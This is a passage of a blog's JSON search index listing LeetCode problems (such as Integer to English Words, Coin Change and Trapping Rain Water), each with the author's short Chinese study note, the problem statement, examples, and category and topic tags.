so all numbers are in the range [0,9]. 8 is the missing number in the range since it does not appear in nums.Example 4:Input: nums = [0]Output: 1Explanation: n = 1 since there is 1 number, so all numbers are in the range [0,1]. 1 is the missing number in the range since it does not appear in nums. Constraints:n == nums.length1 ","categories":["Algorithm","Leetcode","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["Array","Math","Bit Manipulation","Hash Table","Sorting"]},{"title":"leetcode-273 - Integer to English Words","url":"/2021/07/leetcode-273/","content":"動機\n天啊\n\nProblem\nConvert a non-negative integer num to its English words representation. Example 1:Input: num = 123Output: One Hundred Twenty ThreeExample 2:Input: num = 12345Output: Twelve Thousand Three Hundred Forty FiveExample 3:Input: num = 1234567Output: One Million Two Hundred Thirty Four Thousand Five Hundred Sixty SevenExample 4:Input: num = 1234567891Output: One Billion Two Hundred Thirty Four Million Five Hundred Sixty Seven Thousand Eight Hundred Ninety One Constraints:0 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Recursion","String","Math"]},{"title":"leetcode-278 - First Bad Version","url":"/2021/07/leetcode-278/","content":"動機\n複習lower bound\n\nProblem\nYou are a product manager and currently leading a team to develop a new product. Unfortunately, the latest version of your product fails the quality check. Since each version is developed based on the previous version, all the versions after a bad version are also bad.Suppose you have n versions [1, 2, ..., n] and you want to find out the first bad one, which causes all the following ones to be bad.You are given an API bool isBadVersion(version) which returns whether version is bad. Implement a function to find the first bad version. You should minimize the number of calls to the API. Example 1:Input: n = 5, bad = 4Output: 4Explanation:call isBadVersion(3) -> falsecall isBadVersion(5) -> truecall isBadVersion(4) -> trueThen 4 is the first bad version.Example 2:Input: n = 1, bad = 1Output: 1 Constraints:1 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Binary Search","Interactive"]},{"title":"leetcode-279 - Perfect Squares","url":"/2021/07/leetcode-279/","content":"動機\n複習換硬幣的dp\nisqrt是個很貴的運算\n\nProblem\nGiven an integer n, return the least number of perfect square numbers that sum to n.A perfect square is an integer that is the square of an integer; in other words, it is the product of some integer with itself. For example, 1, 4, 9, and 16 are perfect squares while 3 and 11 are not. Example 1:Input: n = 12Output: 3Explanation: 12 = 4 + 4 + 4.Example 2:Input: n = 13Output: 2Explanation: 13 = 4 + 9. Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions"],"tags":["Dynamic Programming","Breadth-First Search","Math"]},{"title":"leetcode-28 - Implement strStr()","url":"/2021/07/leetcode-28/","content":"動機\n複習kmp\n\nProblem\nImplement strStr().Return the index of the first occurrence of needle in haystack, or -1 if needle is not part of haystack.Clarification:What should we return when needle is an empty string? This is a great question to ask during an interview.For the purpose of this problem, we will return 0 when needle is an empty string. This is consistent to C's strstr() and Java's indexOf(). Example 1:Input: haystack = hello, needle = llOutput: 2Example 2:Input: haystack = aaaaa, needle = bbaOutput: -1Example 3:Input: haystack = , needle = Output: 0 Constraints:0 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["String","Two Pointers","String Matching"]},{"title":"leetcode-283 - Move Zeroes","url":"/2021/07/leetcode-283/","content":"動機\n醍醐灌頂!!\n\nProblem\nGiven an integer array nums, move all 0's to the end of it while maintaining the relative order of the non-zero elements.Note that you must do this in-place without making a copy of the array. Example 1:Input: nums = [0,1,0,3,12]Output: [1,3,12,0,0]Example 2:Input: nums = [0]Output: [0] Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions"],"tags":["Array","Two Pointers"]},{"title":"leetcode-284 - Peeking Iterator","url":"/2021/07/leetcode-284/","content":"動機\n要多翻一格\n\nProblem\nDesign an iterator that supports the peek operation on a list in addition to the hasNext and the next operations.Implement the PeekingIterator class:PeekingIterator(int[] nums) Initializes the object with the given integer array nums.int next() Returns the next element in the array and moves the pointer to the next element.bool hasNext() Returns true if there are still elements in the array.int peek() Returns the next element in the array without moving the pointer. Example 1:Input[PeekingIterator, next, peek, next, next, hasNext][[[1, 2, 3]], [], [], [], [], []]Output[null, 1, 2, 2, 3, false]ExplanationPeekingIterator peekingIterator = new PeekingIterator([1, 2, 3]); // [1,2,3]peekingIterator.next();    // return 1, the pointer moves to the next element [1,2,3].peekingIterator.peek();    // return 2, the pointer does not move [1,2,3].peekingIterator.next();    // return 2, the pointer moves to the next element [1,2,3]peekingIterator.next();    // return 3, the pointer moves to the next element [1,2,3]peekingIterator.hasNext(); // return False Constraints:1 ","categories":["Algorithm","Leetcode"],"tags":["Array","Design","Iterator"]},{"title":"leetcode-287 - Find the Duplicate Number","url":"/2021/07/leetcode-287/","content":"動機\n這題有很多有趣的解法\n\nProblem\nGiven an array of integers nums containing n + 1 integers where each integer is in the range [1, n] inclusive.There is only one repeated number in nums, return this repeated number.You must solve the problem without modifying the array nums and uses only constant extra space. Example 1:Input: nums = [1,3,4,2,2]Output: 2Example 2:Input: nums = [3,1,3,4,2]Output: 3Example 3:Input: nums = [1,1]Output: 1Example 4:Input: nums = [1,1,2]Output: 1 Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Array","Two Pointers","Bit Manipulation","Binary Search"]},{"title":"leetcode-29 - Divide Two Integers","url":"/2021/07/leetcode-29/","content":"動機\n阿，除法\n\nProblem\nGiven two integers dividend and divisor, divide two integers without using multiplication, division, and mod operator.Return the quotient after dividing dividend by divisor.The integer division should truncate toward zero, which means losing its fractional part. For example, truncate(8.345) = 8 and truncate(-2.7335) = -2.Note: Assume we are dealing with an environment that could only store integers within the 32-bit signed integer range: [−231, 231 − 1]. For this problem, assume that your function returns 231 − 1 when the division result overflows. Example 1:Input: dividend = 10, divisor = 3Output: 3Explanation: 10/3 = truncate(3.33333..) = 3.Example 2:Input: dividend = 7, divisor = -3Output: -2Explanation: 7/-3 = truncate(-2.33333..) = -2.Example 3:Input: dividend = 0, divisor = 1Output: 0Example 4:Input: dividend = 1, divisor = 1Output: 1 Constraints:-231 ","categories":["Algorithm","Leetcode","Top Interview Questions","CTCI-COMPLETE-LIST"],"tags":["Math","Bit Manipulation"]},{"title":"leetcode-290 - Word Pattern","url":"/2021/07/leetcode-290/","content":"動機\n水題\n\nProblem\nGiven a pattern and a string s, find if s follows the same pattern.Here follow means a full match, such that there is a bijection between a letter in pattern and a non-empty word in s. Example 1:Input: pattern = abba, s = dog cat cat dogOutput: trueExample 2:Input: pattern = abba, s = dog cat cat fishOutput: falseExample 3:Input: pattern = aaaa, s = dog cat cat dogOutput: falseExample 4:Input: pattern = abba, s = dog dog dog dogOutput: false Constraints:1 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["String","Hash Table"]},{"title":"leetcode-295 - Find Median from Data Stream","url":"/2021/07/leetcode-295/","content":"動機\n寫解題心得才意識到，這就是與two pointer很像\n\nProblem\nThe median is the middle value in an ordered integer list. If the size of the list is even, there is no middle value and the median is the mean of the two middle values.For example, for arr = [2,3,4], the median is 3.For example, for arr = [2,3], the median is (2 + 3) / 2 = 2.5.Implement the MedianFinder class:MedianFinder() initializes the MedianFinder object.void addNum(int num) adds the integer num from the data stream to the data structure.double findMedian() returns the median of all elements so far. Answers within 10-5 of the actual answer will be accepted. Example 1:Input[MedianFinder, addNum, addNum, findMedian, addNum, findMedian][[], [1], [2], [], [3], []]Output[null, null, null, 1.5, null, 2.0]ExplanationMedianFinder medianFinder = new MedianFinder();medianFinder.addNum(1);    // arr = [1]medianFinder.addNum(2);    // arr = [1, 2]medianFinder.findMedian(); // return 1.5 (i.e., (1 + 2) / 2)medianFinder.addNum(3);    // arr[1, 2, 3]medianFinder.findMedian(); // return 2.0 Constraints:-105 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["Design","Two Pointers","Heap (Priority Queue)","Sorting","Data Stream"]},{"title":"leetcode-3 - Longest Substring Without Repeating Characters","url":"/2021/07/leetcode-3/","content":"動機\n複習sliding windows\n\nProblem\nGiven a string s, find the length of the longest substring without repeating characters. Example 1:Input: s = abcabcbbOutput: 3Explanation: The answer is abc, with the length of 3.Example 2:Input: s = bbbbbOutput: 1Explanation: The answer is b, with the length of 1.Example 3:Input: s = pwwkewOutput: 3Explanation: The answer is wke, with the length of 3.Notice that the answer must be a substring, pwke is a subsequence and not a substring.Example 4:Input: s = Output: 0 Constraints:0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["String","Hash Table","Sliding Window"]},{"title":"leetcode-300 - Longest Increasing Subsequence","url":"/2021/07/leetcode-300/","content":"動機\n我們不要dp了，jojo\n\nProblem\nGiven an integer array nums, return the length of the longest strictly increasing subsequence.A subsequence is a sequence that can be derived from an array by deleting some or no elements without changing the order of the remaining elements. For example, [3,6,2,7] is a subsequence of the array [0,3,1,6,2,2,7]. Example 1:Input: nums = [10,9,2,5,3,7,101,18]Output: 4Explanation: The longest increasing subsequence is [2,3,7,101], therefore the length is 4.Example 2:Input: nums = [0,1,0,3,2,3]Output: 4Example 3:Input: nums = [7,7,7,7,7,7,7]Output: 1 Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","Array","Binary Search"]},{"title":"leetcode-303 - Range Sum Query - Immutable","url":"/2021/07/leetcode-303/","content":"動機\n複習prefix sum\n\nProblem\nGiven an integer array nums, handle multiple queries of the following type:Calculate the sum of the elements of nums between indices left and right inclusive where left ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Prefix Sum","Design"]},{"title":"leetcode-32 - Longest Valid Parentheses","url":"/2021/07/leetcode-32/","content":"動機\n以後遇到回文優先考慮中心展開\n\nProblem\nGiven a string containing just the characters '(' and ')', find the length of the longest valid (well-formed) parentheses substring. Example 1:Input: s = (()Output: 2Explanation: The longest valid parentheses substring is ().Example 2:Input: s = )()())Output: 4Explanation: The longest valid parentheses substring is ()().Example 3:Input: s = Output: 0 Constraints:0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions"],"tags":["Dynamic Programming","String","Stack"]},{"title":"leetcode-322 - Coin Change","url":"/2021/07/leetcode-322/","content":"動機\n複習dp\n\nProblem\nYou are given an integer array coins representing coins of different denominations and an integer amount representing a total amount of money.Return the fewest number of coins that you need to make up that amount. If that amount of money cannot be made up by any combination of the coins, return -1.You may assume that you have an infinite number of each kind of coin. Example 1:Input: coins = [1,2,5], amount = 11Output: 3Explanation: 11 = 5 + 5 + 1Example 2:Input: coins = [2], amount = 3Output: -1Example 3:Input: coins = [1], amount = 0Output: 0Example 4:Input: coins = [1], amount = 1Output: 1Example 5:Input: coins = [1], amount = 2Output: 2 Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Dynamic Programming","Array","Breadth-First Search"]},{"title":"leetcode-326 - Power of Three","url":"/2021/07/leetcode-326/","content":"動機\n像這種看起來很水的題目，有的時候都會也一些出乎意料的解法\n\nProblem\nGiven an integer n, return true if it is a power of three. Otherwise, return false.An integer n is a power of three, if there exists an integer x such that n == 3x. Example 1:Input: n = 27Output: trueExample 2:Input: n = 0Output: falseExample 3:Input: n = 9Output: trueExample 4:Input: n = 45Output: false Constraints:-231 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Recursion","Math"]},{"title":"leetcode-328 - Odd Even Linked List","url":"/2021/07/leetcode-328/","content":"動機\n真的看不懂以前寫什麼\n\nProblem\nGiven the head of a singly linked list, group all the nodes with odd indices together followed by the nodes with even indices, and return the reordered list.The first node is considered odd, and the second node is even, and so on.Note that the relative order inside both the even and odd groups should remain as it was in the input.You must solve the problem in O(1) extra space complexity and O(n) time complexity. Example 1:Input: head = [1,2,3,4,5]Output: [1,3,5,2,4]Example 2:Input: head = [2,1,3,5,6,4,7]Output: [2,3,6,7,1,5,4] Constraints:n == number of nodes in the linked list0 ","categories":["Algorithm","Leetcode","Top Interview Questions","seanprashad"],"tags":["Linked List"]},{"title":"leetcode-329 - Longest Increasing Path in a Matrix","url":"/2021/07/leetcode-329/","content":"動機\n因為題目特性，不用考慮重複走的問題\n\nProblem\nGiven an m x n integers matrix, return the length of the longest increasing path in matrix.From each cell, you can either move in four directions: left, right, up, or down. You may not move diagonally or move outside the boundary (i.e., wrap-around is not allowed). Example 1:Input: matrix = [[9,9,4],[6,6,8],[2,1,1]]Output: 4Explanation: The longest increasing path is [1, 2, 6, 9].Example 2:Input: matrix = [[3,4,5],[3,2,6],[2,2,1]]Output: 4Explanation: The longest increasing path is [3, 4, 5, 6]. Moving diagonally is not allowed.Example 3:Input: matrix = [[1]]Output: 1 Constraints:m == matrix.lengthn == matrix[i].length1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Dynamic Programming","Breadth-First Search","Depth-First Search","Memoization","Graph","Topological Sort"]},{"title":"leetcode-33 - Search in Rotated Sorted Array","url":"/2021/07/leetcode-33/","content":"動機\n重新體驗binary search\n這題可以與153一起看，會有新的理解\n\nProblem\nThere is an integer array nums sorted in ascending order (with distinct values).Prior to being passed to your function, nums is rotated at an unknown pivot index k (0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","CTCI-COMPLETE-LIST","Blind Curated 75"],"tags":["Array","Binary Search"]},{"title":"leetcode-337 - House Robber III","url":"/2021/07/leetcode-337/","content":"動機\n樹型dp\n用sum(list of list,[])去攤平一層\n\nProblem\nThe thief has found himself a new place for his thievery again. There is only one entrance to this area, called root.Besides the root, each house has one and only one parent house. After a tour, the smart thief realized that all houses in this place form a binary tree. It will automatically contact the police if two directly-linked houses were broken into on the same night.Given the root of the binary tree, return the maximum amount of money the thief can rob without alerting the police. Example 1:Input: root = [3,2,3,null,3,null,1]Output: 7Explanation: Maximum amount of money the thief can rob = 3 + 3 + 1 = 7.Example 2:Input: root = [3,4,5,1,3,null,1]Output: 9Explanation: Maximum amount of money the thief can rob = 4 + 5 = 9. Constraints:The number of nodes in the tree is in the range [1, 104].0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions"],"tags":["Dynamic Programming","Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-34 - Find First and Last Position of Element in Sorted Array","url":"/2021/07/leetcode-34/","content":"動機\nlowerbound與upperbound只差一個等號!!\n\nProblem\nGiven an array of integers nums sorted in ascending order, find the starting and ending position of a given target value.If target is not found in the array, return [-1, -1].You must write an algorithm with O(log n) runtime complexity. Example 1:Input: nums = [5,7,7,8,8,10], target = 8Output: [3,4]Example 2:Input: nums = [5,7,7,8,8,10], target = 6Output: [-1,-1]Example 3:Input: nums = [], target = 0Output: [-1,-1] Constraints:0 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions"],"tags":["Array","Binary Search"]},{"title":"leetcode-341 - Flatten Nested List Iterator","url":"/2021/07/leetcode-341/","content":"動機\n讓每個遞迴只負責一個工作\n\nProblem\nYou are given a nested list of integers nestedList. Each element is either an integer or a list whose elements may also be integers or other lists. Implement an iterator to flatten it.Implement the NestedIterator class:NestedIterator(List nestedList) Initializes the iterator with the nested list nestedList.int next() Returns the next integer in the nested list.boolean hasNext() Returns true if there are still some integers in the nested list and false otherwise.Your code will be tested with the following pseudocode:initialize iterator with nestedListres = []while iterator.hasNext()    append iterator.next() to the end of resreturn resIf res matches the expected flattened list, then your code will be judged as correct. Example 1:Input: nestedList = [[1,1],2,[1,1]]Output: [1,1,2,1,1]Explanation: By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,1,2,1,1].Example 2:Input: nestedList = [1,[4,[6]]]Output: [1,4,6]Explanation: By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,4,6]. Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Depth-First Search","Stack","Design","Tree","Queue","Iterator"]},{"title":"leetcode-344 - Reverse String","url":"/2021/07/leetcode-344/","content":"動機\n就reverse\n\nProblem\nWrite a function that reverses a string. The input string is given as an array of characters s. Example 1:Input: s = [h,e,l,l,o]Output: [o,l,l,e,h]Example 2:Input: s = [H,a,n,n,a,h]Output: [h,a,n,n,a,H] Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Recursion","String","Two Pointers"]},{"title":"leetcode-347 - Top K Frequent Elements","url":"/2021/07/leetcode-347/","content":"動機\n直接sort就好\n\nProblem\nGiven an integer array nums and an integer k, return the k most frequent elements. You may return the answer in any order. Example 1:Input: nums = [1,1,1,2,2,3], k = 2Output: [1,2]Example 2:Input: nums = [1], k = 1Output: [1] Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","Top Interview Questions","seanprashad","Blind Curated 75"],"tags":["Array","Divide and Conquer","Heap (Priority Queue)","Hash Table","Sorting","Counting","Bucket Sort","Quickselect"]},{"title":"leetcode-349 - Intersection of Two Arrays","url":"/2021/07/leetcode-349/","content":"動機\niteratable可以轉成set\n\nProblem\nGiven two integer arrays nums1 and nums2, return an array of their intersection. Each element in the result must be unique and you may return the result in any order. Example 1:Input: nums1 = [1,2,2,1], nums2 = [2,2]Output: [2]Example 2:Input: nums1 = [4,9,5], nums2 = [9,4,9,8,4]Output: [9,4]Explanation: [4,9] is also accepted. Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve"],"tags":["Array","Two Pointers","Binary Search","Hash Table","Sorting"]},{"title":"leetcode-35 - Search Insert Position","url":"/2021/07/leetcode-35/","content":"動機\n複習lowerbound\n\nProblem\nGiven a sorted array of distinct integers and a target value, return the index if the target is found. If not, return the index where it would be if it were inserted in order.You must write an algorithm with O(log n) runtime complexity. Example 1:Input: nums = [1,3,5,6], target = 5Output: 2Example 2:Input: nums = [1,3,5,6], target = 2Output: 1Example 3:Input: nums = [1,3,5,6], target = 7Output: 4Example 4:Input: nums = [1,3,5,6], target = 0Output: 0Example 5:Input: nums = [1], target = 0Output: 0 Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve"],"tags":["Array","Binary Search"]},{"title":"leetcode-350 - Intersection of Two Arrays II","url":"/2021/07/leetcode-350/","content":"動機\n如果沒有限制就很水\n\nProblem\nGiven two integer arrays nums1 and nums2, return an array of their intersection. Each element in the result must appear as many times as it shows in both arrays and you may return the result in any order. Example 1:Input: nums1 = [1,2,2,1], nums2 = [2,2]Output: [2,2]Example 2:Input: nums1 = [4,9,5], nums2 = [9,4,9,8,4]Output: [4,9]Explanation: [9,4] is also accepted. Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["Array","Two Pointers","Binary Search","Hash Table","Sorting"]},{"title":"leetcode-371 - Sum of Two Integers","url":"/2021/07/leetcode-371/","content":"動機\n當初是自幹加法器與2補數…\n該學會用bit operation了，這操作太神啦!!\n\nProblem\nGiven two integers a and b, return the sum of the two integers without using the operators + and -. Example 1:Input: a = 1, b = 2Output: 3Example 2:Input: a = 2, b = 3Output: 5 Constraints:-1000 ","categories":["Algorithm","Leetcode","Top Interview Questions","Blind Curated 75"],"tags":["Math","Bit Manipulation"]},{"title":"leetcode-376 - Wiggle Subsequence","url":"/2021/07/leetcode-376/","content":"動機\n居然用自己的dp過了!!\n\nProblem\nA wiggle sequence is a sequence where the differences between successive numbers strictly alternate between positive and negative. The first difference (if one exists) may be either positive or negative. A sequence with one element and a sequence with two non-equal elements are trivially wiggle sequences.For example, [1, 7, 4, 9, 2, 5] is a wiggle sequence because the differences (6, -3, 5, -7, 3) alternate between positive and negative.In contrast, [1, 4, 7, 2, 5] and [1, 7, 4, 5, 5] are not wiggle sequences. The first is not because its first two differences are positive, and the second is not because its last difference is zero.A subsequence is obtained by deleting some elements (possibly zero) from the original sequence, leaving the remaining elements in their original order.Given an integer array nums, return the length of the longest wiggle subsequence of nums. Example 1:Input: nums = [1,7,4,9,2,5]Output: 6Explanation: The entire sequence is a wiggle sequence with differences (6, -3, 5, -7, 3).Example 2:Input: nums = [1,17,5,10,13,15,10,5,16,8]Output: 7Explanation: There are several subsequences that achieve this length.One is [1, 17, 10, 13, 10, 16, 8] with differences (16, -7, 3, -3, 6, -8).Example 3:Input: nums = [1,2,3,4,5,6,7,8,9]Output: 2 Constraints:1 ","categories":["Algorithm","Leetcode","CTCI-COMPLETE-LIST"],"tags":["Dynamic Programming","Array","Greedy"]},{"title":"leetcode-384 - Shuffle an Array","url":"/2021/07/leetcode-384/","content":"動機\npython有shuffle\n\nProblem\nGiven an integer array nums, design an algorithm to randomly shuffle the array. All permutations of the array should be equally likely as a result of the shuffling.Implement the Solution class:Solution(int[] nums) Initializes the object with the integer array nums.int[] reset() Resets the array to its original configuration and returns it.int[] shuffle() Returns a random shuffling of the array. Example 1:Input[Solution, shuffle, reset, shuffle][[[1, 2, 3]], [], [], []]Output[null, [3, 1, 2], [1, 2, 3], [1, 3, 2]]ExplanationSolution solution = new Solution([1, 2, 3]);solution.shuffle();    // Shuffle the array [1,2,3] and return its result.                       // Any permutation of [1,2,3] must be equally likely to be returned.                       // Example: return [3, 1, 2]solution.reset();      // Resets the array back to its original configuration [1,2,3]. Return [1, 2, 3]solution.shuffle();    // Returns the random shuffling of array [1,2,3]. Example: return [1, 3, 2] Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions","CTCI-COMPLETE-LIST"],"tags":["Array","Math","Randomized"]},{"title":"leetcode-387 - First Unique Character in a String","url":"/2021/07/leetcode-387/","content":"動機\n複習Counter\n\nProblem\nGiven a string s, find the first non-repeating character in it and return its index. If it does not exist, return -1. Example 1:Input: s = leetcodeOutput: 0Example 2:Input: s = loveleetcodeOutput: 2Example 3:Input: s = aabbOutput: -1 Constraints:1 ","categories":["Algorithm","Leetcode","60 questions to solve","Top Interview Questions"],"tags":["String","Hash Table","Counting","Queue"]},{"title":"leetcode-39 - Combination Sum","url":"/2021/07/leetcode-39/","content":"動機\n複習backtrack\nbacktrack也是遞迴，所以也是看有什麼case(可以做的動作)\n\nProblem\nGiven an array of distinct integers candidates and a target integer target, return a list of all unique combinations of candidates where the chosen numbers sum to target. You may return the combinations in any order.The same number may be chosen from candidates an unlimited number of times. Two combinations are unique if the frequency of at least one of the chosen numbers is different.It is guaranteed that the number of unique combinations that sum up to target is less than 150 combinations for the given input. Example 1:Input: candidates = [2,3,6,7], target = 7Output: [[2,2,3],[7]]Explanation:2 and 3 are candidates, and 2 + 2 + 3 = 7. Note that 2 can be used multiple times.7 is a candidate, and 7 = 7.These are the only two combinations.Example 2:Input: candidates = [2,3,5], target = 8Output: [[2,2,2,2],[2,3,3],[3,5]]Example 3:Input: candidates = [2], target = 1Output: []Example 4:Input: candidates = [1], target = 1Output: [[1]]Example 5:Input: candidates = [1], target = 2Output: [[1,1]] Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","60 questions to solve","seanprashad","Blind Curated 75"],"tags":["Array","Backtracking"]},{"title":"leetcode-392 - Is Subsequence","url":"/2021/07/leetcode-392/","content":"動機\n為什麼之前的commit這麼複雜\n\nProblem\nGiven two strings s and t, return true if s is a subsequence of t, or false otherwise.A subsequence of a string is a new string that is formed from the original string by deleting some (can be none) of the characters without disturbing the relative positions of the remaining characters. (i.e., ace is a subsequence of abcde while aec is not). Example 1:Input: s = abc, t = ahbgdcOutput: trueExample 2:Input: s = axc, t = ahbgdcOutput: false Constraints:0 ","categories":["Algorithm","Leetcode","60 questions to solve"],"tags":["Dynamic Programming","String","Two Pointers"]},{"title":"leetcode-394 - Decode String","url":"/2021/07/leetcode-394/","content":"動機\n不是所有括號都要遞迴\n\nProblem\nGiven an encoded string, return its decoded string.The encoding rule is: k[encoded_string], where the encoded_string inside the square brackets is being repeated exactly k times. Note that k is guaranteed to be a positive integer.You may assume that the input string is always valid; No extra white spaces, square brackets are well-formed, etc.Furthermore, you may assume that the original data does not contain any digits and that digits are only for those repeat numbers, k. For example, there won't be input like 3a or 2[4]. Example 1:Input: s = 3[a]2[bc]Output: aaabcbcExample 2:Input: s = 3[a2[c]]Output: accaccaccExample 3:Input: s = 2[abc]3[cd]efOutput: abcabccdcdcdefExample 4:Input: s = abc3[cd]xyzOutput: abccdcdcdxyz Constraints:1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions"],"tags":["Recursion","String","Stack"]},{"title":"leetcode-40 - Combination Sum II","url":"/2021/07/leetcode-40/","content":"動機\n處理backtrack的重複就是在同一層展開完，再到下一層去\n\nProblem\nGiven a collection of candidate numbers (candidates) and a target number (target), find all unique combinations in candidates where the candidate numbers sum to target.Each number in candidates may only be used once in the combination.Note: The solution set must not contain duplicate combinations. Example 1:Input: candidates = [10,1,2,7,6,1,5], target = 8Output: [[1,1,6],[1,2,5],[1,7],[2,6]]Example 2:Input: candidates = [2,5,2,1,2], target = 5Output: [[1,2,2],[5]] Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad"],"tags":["Array","Backtracking"]},{"title":"leetcode-412 - Fizz Buzz","url":"/2021/07/leetcode-412/","content":"動機\n超常見水題\n\nProblem\nGiven an integer n, return a string array answer (1-indexed) where:answer[i] == FizzBuzz if i is divisible by 3 and 5.answer[i] == Fizz if i is divisible by 3.answer[i] == Buzz if i is divisible by 5.answer[i] == i if non of the above conditions are true. Example 1:Input: n = 3Output: [1,2,Fizz]Example 2:Input: n = 5Output: [1,2,Fizz,4,Buzz]Example 3:Input: n = 15Output: [1,2,Fizz,4,Buzz,Fizz,7,8,Fizz,Buzz,11,Fizz,13,14,FizzBuzz] Constraints:1 ","categories":["Algorithm","Leetcode","Top Interview Questions"],"tags":["String","Math","Simulation"]},{"title":"leetcode-417 - Pacific Atlantic Water Flow","url":"/2021/07/leetcode-417/","content":"動機\n要用dfs(+dp)要注意會不會重複走\n\nProblem\nThere is an m x n rectangular island that borders both the Pacific Ocean and Atlantic Ocean. The Pacific Ocean touches the island's left and top edges, and the Atlantic Ocean touches the island's right and bottom edges.The island is partitioned into a grid of square cells. You are given an m x n integer matrix heights where heights[r][c] represents the height above sea level of the cell at coordinate (r, c).The island receives a lot of rain, and the rain water can flow to neighboring cells directly north, south, east, and west if the neighboring cell's height is less than or equal to the current cell's height. Water can flow from any cell adjacent to an ocean into the ocean.Return a 2D list of grid coordinates result where result[i] = [ri, ci] denotes that rain water can flow from cell (ri, ci) to both the Pacific and Atlantic oceans. Example 1:Input: heights = [[1,2,2,3,5],[3,2,3,4,4],[2,4,5,3,1],[6,7,1,4,5],[5,1,1,2,4]]Output: [[0,4],[1,3],[1,4],[2,2],[3,0],[3,1],[4,0]]Example 2:Input: heights = [[2,1],[1,2]]Output: [[0,0],[0,1],[1,0],[1,1]] Constraints:m == heights.lengthn == heights[r].length1 ","categories":["Algorithm","Leetcode","seanprashad","Blind Curated 75"],"tags":["Array","Matrix","Breadth-First Search","Depth-First Search"]},{"title":"leetcode-42 - Trapping Rain Water","url":"/2021/07/leetcode-42/","content":"動機\n每次看經典題與他的解答都是新的發現\n這邊居然有dp 與 two pointer\n\nProblem\nGiven n non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it can trap after raining. Example 1:Input: height = [0,1,0,2,1,0,1,3,2,1,2,1]Output: 6Explanation: The above elevation map (black section) is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped.Example 2:Input: height = [4,2,0,3,2,5]Output: 9 Constraints:n == height.length1 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","Top Interview Questions","seanprashad"],"tags":["Dynamic Programming","Array","Stack","Two Pointers","Monotonic Stack"]},{"title":"leetcode-424 - Longest Repeating Character Replacement","url":"/2021/07/leetcode-424/","content":"動機\nlee215太神啦!!\n\nProblem\nYou are given a string s and an integer k. You can choose any character of the string and change it to any other uppercase English character. You can perform this operation at most k times.Return the length of the longest substring containing the same letter you can get after performing the above operations. Example 1:Input: s = ABAB, k = 2Output: 4Explanation: Replace the two 'A's with two 'B's or vice versa.Example 2:Input: s = AABABBA, k = 1Output: 4Explanation: Replace the one 'A' in the middle with 'B' and form AABBBBA.The substring BBBB has the longest repeating letters, which is 4. Constraints:1 ","categories":["Algorithm","Leetcode","seanprashad","Blind Curated 75"],"tags":["String","Hash Table","Sliding Window"]},{"title":"leetcode-437 - Path Sum III","url":"/2021/07/leetcode-437/","content":"動機\n原來是prefix sum的靈壓!!\n\nProblem\nGiven the root of a binary tree and an integer targetSum, return the number of paths where the sum of the values along the path equals targetSum.The path does not need to start or end at the root or a leaf, but it must go downwards (i.e., traveling only from parent nodes to child nodes). Example 1:Input: root = [10,5,-3,3,2,null,11,3,-2,null,1], targetSum = 8Output: 3Explanation: The paths that sum to 8 are shown.Example 2:Input: root = [5,4,8,11,null,13,4,7,2,null,null,5,1], targetSum = 22Output: 3 Constraints:The number of nodes in the tree is in the range [0, 1000].-109 ","categories":["Algorithm","Leetcode","Top 100 Liked Questions","seanprashad","CTCI-COMPLETE-LIST"],"tags":["Depth-First Search","Binary Tree","Tree"]},{"title":"leetcode-44 - Wildcard Matching","url":"/2021/07/leetcode-44/","content":"動機\n很有趣的dp\n\nProblem\nGiven an input string (s) and a pattern (p), implement wildcard pattern matching with support for '?' and '*' where:'?' Matches any single character.'*' Matches any sequence of characters (including the empty sequence).The matching should cover the entire input string (not partial). Example 1:Input: s = aa, p = aOutput: falseExplanation: a does not match the entire string aa.Example 2:Input: s = aa, p = *Output: trueExplanation: '*' matches any sequence.Example 3:Input: s = cb, p = ?aOutput: falseExplanation: '?' matches 'c', but the second letter is 'a', which does not match 'b'.Example 4:Input: s 